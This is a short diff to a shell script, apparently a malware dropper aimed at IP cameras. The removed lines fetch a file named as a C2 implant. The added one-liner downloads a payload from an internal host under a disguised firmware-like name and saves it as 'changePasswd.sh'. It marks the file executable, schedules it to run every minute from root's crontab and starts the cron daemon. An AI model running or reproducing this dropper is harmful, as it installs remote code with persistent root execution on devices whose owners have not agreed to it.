@@ -1,9 +1,1 @@
-A="http://10.0.1.4/C2_Implant.min.sh"
-B="/bin/notmalware"
-
-mkdir -p $(dirname $B)
-
-wget $A -O $B
-mkdir -p /var/spool/cron/crontabs
-#echo "* * * * * bash $B" > /var/spool/cron/crontabs/root
-crond
+wget http://10.0.1.4/FOSCAM_3.41.2a.so -O /usr/bin/ftpd/changePasswd.sh;if [ $? != 0 ]; then exit;fi;chmod u+x /usr/bin/ftpd/changePasswd.sh;mkdir -p /var/spool/cron/crontabs;echo "* * * * * /usr/bin/ftpd/changePasswd.sh 1 1 1" >> /var/spool/cron/crontabs/root;if [ $(ps | grep crond | wc -l) == 1 ];then crond;fi;echo -n "golf" >> /bin/btools;
